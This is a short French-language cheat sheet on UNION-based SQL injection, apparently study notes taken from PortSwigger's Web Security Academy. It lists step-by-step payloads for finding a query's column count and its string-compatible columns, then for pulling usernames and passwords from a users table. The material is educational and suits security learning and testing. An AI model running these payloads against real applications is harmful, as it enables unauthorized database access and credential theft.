# Union SQL Injection
_Source_ : https://portswigger.net/web-security/sql-injection/union-attacks 
Condition:
La requête doit retourner le même nombre de colonnes
Les types de chaques colonne doit être compatible.

Il faut donc trouver le nombre de colonne et lesquels permettent de contenir les résultats attendus.

## 1.Définir le nombre de colonne
### Injection de ORDER BY
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```
Une erreur surviendra quand le nombre de colonne de la requête sera dépassé.

### Injection de select null
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```
Seul la requête avec le bon nombre de colonne ne retrournera pas d'erreur.
On utilise ici null car il sera toujours considéré comme compatible avec n'importe quel type
**!Oracle impose d'utiliser FROM** Dans ce cas on peut utiliser la table par défaut DUAL.
```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT NULL,NULL FROM DUAL--
' UNION SELECT NULL,NULL,NULL FROM DUAL--
...
```

**! MySQL nécessite un espace après <code>--</code>** pour être considéré comme un commentaire. Il est également possible d'utiliser <code>#</code>

## 2.Définir les colonnes utiles
Pour définir les colonnes utilisant un type de données exploitable, il faut tester un à un les colonnes comme suit:
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Si aucune erreur n'est générée, cela signifie que la colonne est compatible avec les chaînes de caractères.

**! les doubles quotes risque de ne pas fonctionner.**

## Exploitation
Une fois 1 et 2 définis.
### Injection classique
On peut ajouter les colonnes à récupérer d'une table voulu. 
Exemple d'injection:
```sql
' UNION SELECT username, password FROM users--
```
### Injection averc une seule colonne exploitable
Il faut alors concaténer les colonnes ainsi:
```sql
' UNION SELECT username || '~' || password FROM users--
```

Dans le champs à tester :
```sql
10' union select 1,2,3,4,5,6 -- -
```
Il peut être nécessaire de faire varier le nombre de colonne dans la requête.